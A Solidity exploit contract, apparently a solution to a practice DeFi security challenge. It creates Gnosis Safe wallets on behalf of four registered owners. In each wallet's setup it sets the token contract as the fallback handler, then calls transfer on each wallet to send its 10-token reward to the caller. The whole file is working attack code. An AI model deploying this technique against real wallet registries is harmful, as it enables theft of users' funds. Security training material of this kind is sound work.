// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./WalletRegistry.sol";

contract WalletRegistryAttacker {
    GnosisSafeProxyFactory factory;
    WalletRegistry registry;
    address[] owners;
    address dvtToken;

    constructor(
        address _factory,
        address _registry,
        address[] memory _owners,
        address _dvtToken
    ) {
        factory = GnosisSafeProxyFactory(_factory);
        registry = WalletRegistry(_registry);
        owners = _owners;
        dvtToken = _dvtToken;
    }

    function attack() external {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory owners1 = new address[](1);
            owners1[0] = owners[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners1,
                1,
                address(0),
                "",
                dvtToken,
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                registry.masterCopy(),
                initializer,
                0,
                registry
            );

            (bool s, ) = address(proxy).call(
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    tx.origin,
                    10 ether
                )
            );
            require(s, "CALL FAILED");
        }
    }
}
